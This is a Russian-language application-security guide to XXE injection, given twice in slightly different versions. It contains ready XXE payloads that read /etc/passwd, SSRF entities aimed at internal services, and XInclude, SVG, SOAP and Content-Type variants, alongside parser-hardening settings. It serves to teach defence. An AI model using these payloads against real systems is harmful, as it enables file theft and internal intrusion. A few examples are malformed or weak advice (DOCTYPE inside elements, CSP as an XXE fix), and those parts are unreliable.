# XML External Entity (XXE) Injection: Краткое руководство для AppSec специалиста

## Что такое XXE?
**XXE-уязвимость** — это уязвимость в обработке XML-данных, позволяющая злоумышленнику:
* Читать файлы на сервере
* Выполнять SSRF-атаки
* Передавать данные вовне
* Получать доступ к внутренним системам

## Основные типы атак
* **Чтение файлов** через file:// протокол
* **SSRF-атаки** через HTTP/HTTPS запросы
* **Слепые атаки** с использованием OAST-методов
* **Эксплуатация через ошибки** парсера XML

## Примеры атак
**Базовая полезная нагрузка для чтения файла:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Пример SSRF-атаки:**
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal.resource">
]>
```

## Способы обнаружения
* Проверка полей ввода XML на возможность добавления DOCTYPE
* Использование Burp Collaborator для слепых атак
* Тестирование через XInclude при ограниченном контроле XML
* Анализ загрузки файлов (SVG, DOCX)
* Проверка альтернативных Content-Type (text/xml)

## Защита от XXE
**Основные меры:**
* Отключение обработки внешних сущностей в парсере
* Запрет DTD в XML
* Использование безопасных библиотек

**Конкретные настройки:**
* Для Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

* Для .NET:
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

* Для Python:
```python
from defusedxml.ElementTree import parse
```

**Дополнительные меры:**
* Валидация XML-схем (XSD)
* Ограничение прав доступа парсера
* Мониторинг подозрительных запросов
* Регулярное тестирование безопасности
* Использование Content Security Policy

## Важные замечания
* Проверять все места обработки XML, включая скрытые точки входа
* Учитывать возможность обхода через XInclude
* Следить за обновлениями библиотек парсинга XML
* Проводить тестирование на разных платформах и конфигурациях

# XML External Entity (XXE) Injection: Краткое руководство для AppSec специалиста

## 1. Что такое инъекция внешней сущности XML?
**XXE-уязвимость** — это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Позволяет:
* Получать доступ к файлам на сервере
* Выполнять SSRF-атаки
* Взаимодействовать с внутренними системами

## 2. Как возникают уязвимости XXE?
Появляются из-за особенностей спецификации XML, где стандартные парсеры по умолчанию поддерживают потенциально опасные функции. Возникают при:
* Обработке XML-данных
* Использовании стандартных библиотек парсинга
* Отсутствии должной конфигурации безопасности

## 3. XML-сущности (DTD, внешние)
**XML-сущности** — специальные обозначения для представления символов. Основные типы:
* **Внутренние сущности**: предопределенные символы (```&lt;```, ```&gt;```)
* **Внешние сущности**: ссылки на внешние ресурсы через ```SYSTEM```
Пример внешней сущности:
```xml
<!DOCTYPE root [
    <!ENTITY ext SYSTEM "file:///etc/passwd">
]>
```

## 4. Типы атак XXE
* **Извлечение файлов** — чтение локальных файлов.

Пример атаки:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
* **SSRF-атаки** — взаимодействие с внутренними системами

Пример SSRF-атаки:
```xml
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://internal-service">
]>
```
* **Слепые XXE** — эксфильтрация через сторонние запросы
* **Ошибки парсинга** — получение данных через сообщения об ошибках

## 5. Слепые уязвимости XXE
Используются при отсутствии прямого возврата данных. Методы:
* Внеполосное обнаружение OAST через контролируемые домены
* Эксплуатация через ошибки парсинга
* Использование XInclude

## 6. Обнаружение поверхности атаки
Скрытые векторы:
* Загрузка файлов (SVG, DOCX)
```xml
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
    <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <text>&xxe;</text>
```
* Модификация Content-Type (пример подмены типа контента в POST запросе):
```http
POST /upload HTTP/1.1
Content-Type: text/xml
...
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
* XInclude-атаки (пример внедрения через XInclude):
```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</data>
```
* Внедрение через SOAP-запросы:
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <SOAP-ENV:Body>&xxe;</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

## 7. Как найти и проверить XXE
Методы тестирования:
* Сканирование с помощью Burp Suite
* Ручное тестирование с тестовыми payload
* Проверка всех XML-интерфейсов
* Анализ обработки файлов

## 8. Предотвращение XXE
Меры защиты:
* Отключение внешних сущностей в парсере (пример настройки для Java):
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
* Использование безопасных библиотек
```py
from defusedxml.ElementTree import parse
tree = parse('input.xml')
```
* Валидация XML-схем (пример XSD-схемы):
```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="root" type="xs:string"/>
</xs:schema>
```
* Ограничение прав доступа:
```
chmod 600 sensitive_file.xml
```

* Регулярное обновление библиотек

pip install --upgrade defusedxml
